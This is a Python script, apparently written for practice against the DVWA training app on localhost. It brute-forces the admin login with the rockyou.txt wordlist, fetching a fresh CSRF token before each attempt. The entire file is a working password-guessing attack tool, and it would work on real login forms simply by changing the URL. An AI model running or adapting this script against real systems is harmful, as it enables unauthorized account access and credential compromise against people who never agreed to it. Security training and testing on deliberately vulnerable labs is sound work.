import requests
import time
from bs4 import BeautifulSoup

URL = "http://localhost/dvwa/login.php"
USERNAME = "admin"
WORDLIST = "rockyou.txt"

session = requests.Session()

def get_csrf_token():
    try:
        response = session.get(URL)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        token_input = soup.find("input", {"name": "user_token"})
        return token_input["value"] if token_input else None
    except requests.RequestException as e:
        print(f"⚠️ Failed to fetch CSRF token: {e}")
        return None

def attempt_login(password, token):
    data = {
        "username": USERNAME,
        "password": password.strip(),
        "Login": "Login",
        "user_token": token
    }
    try:
        response = session.post(URL, data=data)
        response.raise_for_status()
        return response
    except requests.RequestException as e:
        print(f"⚠️ Login request failed: {e}")
        return None

def main():
    try:
        with open(WORDLIST, "r", encoding="latin-1") as f:
            for line_num, password in enumerate(f, 1):
                token = get_csrf_token()
                if not token:
                    print("❌ Could not retrieve CSRF token. Exiting.")
                    break

                response = attempt_login(password, token)
                if not response:
                    print("❌ Skipping due to failed login request.")
                    continue

                if "Login failed" not in response.text:
                    print(f"\n✅ Password found: {password.strip()} (line {line_num})")
                    break
                else:
                    print(f"❌ Tried: {password.strip()}")

                time.sleep(0.5)
    except FileNotFoundError:
        print(f"❌ Wordlist not found: {WORDLIST}")
    except KeyboardInterrupt:
        print("\n⏹️ Script interrupted by user.")

if __name__ == "__main__":
    main()
